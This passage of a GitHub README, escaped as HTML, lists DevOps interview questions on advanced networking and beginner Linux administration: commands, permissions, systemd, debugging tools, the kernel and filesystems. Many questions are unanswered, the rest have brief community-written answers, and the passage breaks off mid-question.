&lt;p&gt;&lt;a name="user-content-network-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-2" class="anchor" aria-hidden="true" href="#star-advanced-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain Spanning Tree Protocol (STP)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is link aggregation? Why is it used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Asymmetric Routing? How do deal with it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What overlay (tunnel) protocols are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is GRE? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is VXLAN? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SNAT?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain OSPF&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Spine &amp;amp; Leaf&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Network Congestion? What can cause it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What can you tell me about UDP packet format? What about TCP packet format? How is it different?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Using Hamming code, what would be the code word for the following data word 100111010001101?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;00110011110100011101
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-linux" class="anchor" aria-hidden="true" href="#linux"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-linux-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-5" class="anchor" aria-hidden="true" href="#baby-beginner-5"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is your experience with Linux?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;An open question. Answer based on your real experience. You can highlight one or more of the following:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Troubleshooting &amp;amp; Debugging&lt;/li&gt;
&lt;li&gt;Storage&lt;/li&gt;
&lt;li&gt;Networking&lt;/li&gt;
&lt;li&gt;Development&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Deployments
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what each of the following commands does and give an example on how to use it:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ls&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rm&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rmdir (can you achieve the same result by using &lt;code&gt;rm&lt;/code&gt;?)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;grep&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;wc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;curl&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;touch&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;man&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nslookup or dig&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;df&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;&lt;p&gt;&lt;/p&gt;

&lt;li&gt;
&lt;p&gt;ls - list files and directories. You can highlight common flags like -d, -a, -l, ...&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rm - remove files and directories. You should mention -r for recursive removal&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rmdir - remove directories but you should mention it's possible to use rm for that&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;grep - print lines that match patterns. Could be nice to mention -v, -r, -E flags&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;wc - print newline, word, and byte counts&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;curl - tranfer a URL or mention common usage like downloading files, API calls, ...&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;touch - update timestamps but common usage is to create files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;man - reference manuals&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nslookup or dig - query nameservers&lt;/p&gt;
&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;df - provides info regarding file system disk space usage
&lt;/b&gt;&lt;/p&gt;&lt;/li&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;


&lt;details&gt;
&lt;summary&gt;Running the command &lt;code&gt;df&lt;/code&gt; you get "command not found". What could be wrong and how to fix it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;
&lt;p&gt;&lt;b&gt;
Most likely the default/generated $PATH was somehow modified or overridden thus not containing &lt;code&gt;/bin/&lt;/code&gt; where df would normally go.
This issue could also happen if bash_profile or any configuration file of your interpreter was wrongly modified, causing erratics behaviours.
You would solve this by fixing your $PATH variable:
&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;As to fix it there are serveral options:&lt;/b&gt;&lt;/p&gt;&lt;b&gt;
&lt;ol&gt;
&lt;li&gt;Manually adding what you need to your $PATH &lt;code&gt;PATH="$PATH":/user/bin:/..etc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;You have your weird env variables backed up.&lt;/li&gt;
&lt;li&gt;You would look for your distro default $PATH variable, copy paste using method #1&lt;/li&gt;
&lt;/ol&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Note: There are many ways of getting errors like this: if bash_profile or any configuration file of your interpreter was wrongly modified; causing erratics behaviours,
permissions issues, bad compiled software (if you compiled it by yourself)... there is no answer that will be true 100% of the time.
&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you schedule tasks periodically?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You can use the commands &lt;code&gt;cron&lt;/code&gt; and &lt;code&gt;at&lt;/code&gt;.
With cron, tasks are scheduled using the following format:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*/30 * * * * bash myscript.sh&lt;/code&gt; Executes the script every 30 minutes.&lt;/p&gt;
&lt;p&gt;     &lt;/p&gt;
&lt;p&gt;The tasks are stored in a cron file, you can write in it using &lt;code&gt;crontab -e&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Alternatively if you are using a distro with systemd it's recommended to use systemd timers.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Have you scheduled tasks in the past? What kind of tasks?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Normally you will schedule batch jobs.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-permissions" class="anchor" aria-hidden="true" href="#permissions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Permissions&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;How to change the permissions of a file?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Using the &lt;code&gt;chmod&lt;/code&gt; command.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What does the following permissions mean?:
&lt;ul&gt;
&lt;li&gt;777&lt;/li&gt;
&lt;li&gt;644&lt;/li&gt;
&lt;li&gt;750&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;

&lt;pre&gt;777 - You give the owner, group and other: Execute (1), Write (2) and Read (4); 4+2+1 = 7.
644 - Owner has Read (4), Write (2), 4+2 = 6; Group and Other have Read (4).
750 - Owner has x+r+w, Group has Read (4) and Execute (1); 4+1 = 5. Other have no permissions.
&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is setgid, setuid and sticky bit&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You try to delete a file but it fails. Name at least three different reason as to why it could happen&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;No more disk space&lt;/li&gt;
&lt;li&gt;No more indoes&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;No permissions
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is systemd?&lt;/summary&gt;&lt;br&gt;
&lt;b&gt;
Systemd is a daemon (System 'd', d stands from daemon).
&lt;p&gt;A daemon is a program that runs in the background without direct control of the user, although the user can at any time
talk to the daemon.&lt;/p&gt;
&lt;p&gt;systemd has many features such as user processes control/tracking, snapshot support, inhibitor locks..&lt;/p&gt;
&lt;p&gt;If we visualize the unix/linux system in layers, systemd would fall directly after the linux kernel.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Hardware -&amp;gt; Kernel -&amp;gt; Daemons, System Libraries, Server Display.
&lt;/b&gt;&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;On a system which uses systemd, how would you display the logs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;journalctl&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Describe how to make a certain process/app a service&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you kill a process in D state?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-debugging-beginner" class="anchor" aria-hidden="true" href="#debugging-beginner"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debugging (Beginner)&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;network&lt;/b&gt; issues?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;dstat -t&lt;/code&gt; is great for identifying network and disk issues.
&lt;code&gt;netstat -tnlaup&lt;/code&gt; can be used to see which processes are running on which ports.
&lt;code&gt;lsof -i -P&lt;/code&gt; can be used for the same purpose as netstat.
&lt;code&gt;ngrep -d any metafilter&lt;/code&gt; for matching regex against payloads of packets.
&lt;code&gt;tcpdump&lt;/code&gt; for capturing packets
&lt;code&gt;wireshark&lt;/code&gt; same concept as tcpdump but with GUI (optional).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;disk &amp;amp; file system&lt;/b&gt; issues?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;dstat -t&lt;/code&gt; is great for identifying network and disk issues.
&lt;code&gt;opensnoop&lt;/code&gt; can be used to see which files are being opened on the system (in real time).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;process&lt;/b&gt; issues?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;strace&lt;/code&gt; is great for understanding what your program does. It prints every system call your program executed.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are you using for debugging CPU related issues?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;top&lt;/code&gt; will show you how much CPU percentage each process consumes
&lt;code&gt;perf&lt;/code&gt; is a great choice for sampling profiler and in general, figuring out what your CPU cycles are "wasted" on
&lt;code&gt;flamegraphs&lt;/code&gt; is great for CPU consumption visualization (&lt;a href="http://www.brendangregg.com/flamegraphs.html" rel="nofollow"&gt;http://www.brendangregg.com/flamegraphs.html&lt;/a&gt;)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You get a call from someone claiming "my system is SLOW". What do yo do?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Check with &lt;code&gt;top&lt;/code&gt; for anything unusual&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;dstat -t&lt;/code&gt; to check if it's related to disk or network.&lt;/li&gt;
&lt;li&gt;Check if it's network related with &lt;code&gt;sar&lt;/code&gt;&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Check I/O stats with &lt;code&gt;iostat&lt;/code&gt;
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain iostat output&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to debug binaries?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What kind of information one can find in /proc?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between CPU load and utilization?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How you measure time execution of a program?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-kernel" class="anchor" aria-hidden="true" href="#kernel"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kernel&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How do you find out which Kernel version your system is using?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a Linux kernel module and how do you load a new module?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain user space and kernel space&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Wildcards are implemented on user or kernel space?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is KVM?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SSH key? How is it used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between SSH and SSL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SSH port forwarding?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain redirection&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are wildcards? Can you give an example of how to use them?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What do we grep for in each of the following commands?:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}' some_file&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;grep -E "error|failure" some_file&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;grep '[0-9]$' some_file&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;An IP address&lt;/li&gt;
&lt;li&gt;The word "error" or "failure"&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Lines which end with a number
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Tell me everything you know about the Linux boot process&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Another way to ask this: what happens from the moment you turned on the server until you get a prompt
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an exit code? What exit codes are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;An exit code (or return code) represents the code returned by a child process to its
parent process.&lt;/p&gt;
&lt;p&gt;0 is an exit code which represents success while anything higher than 1 represents error.
Each number has different meaning, based on how the application was developed.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;I consider this as a good blog post to read more about it: &lt;a href="https://shapeshed.com/unix-exit-codes" rel="nofollow"&gt;https://shapeshed.com/unix-exit-codes&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-storage--filesystem-beginner" class="anchor" aria-hidden="true" href="#storage--filesystem-beginner"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Storage &amp;amp; Filesystem (Beginner)&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What's an inode?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;For each file (and directory) in Linux there is an inode, a data structure which stores meta data
related to the file like its size, owner, permissions, etc.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Which of the following is not included in inode:
&lt;ul&gt;
&lt;li&gt;Link count&lt;/li&gt;
&lt;li&gt;File size&lt;/li&gt;
&lt;li&gt;File name&lt;/li&gt;
&lt;li&gt;File timestamp&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How to check which disks are currently mounted?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You run mount command but you get no output. How would you check what mounts you have on your system?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between a soft link and hard link?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Hard link is the same file, using the same inode.
Soft link is a shortcut to another file, using a different inode.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? You can create an hard link for a directory&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;False
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? You can create a soft link between different filesystems&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;True
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What happens when you delete the original file in case of soft link and hard link?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a swap partition? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to create a
  * new empty file 
  * a file with text (without using text editor)
  * a file with given size&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You are trying to create a new file but you get "File system is full". You check with df for free space and you see you used only 20% of the space. What could be the problem?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How would you check what is the size of a certain directory?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What do you know about LVM?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following in regards to LVM:
&lt;ul&gt;
&lt;li&gt;PV&lt;/li&gt;
&lt;li&gt;VG&lt;/li&gt;
&lt;li&gt;LV&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is NFS? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What RAID is used for? Can you explain the differences between RAID 0, 1, 5 and 10?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe the process of extending a filesystem disk space&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is lazy umount?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
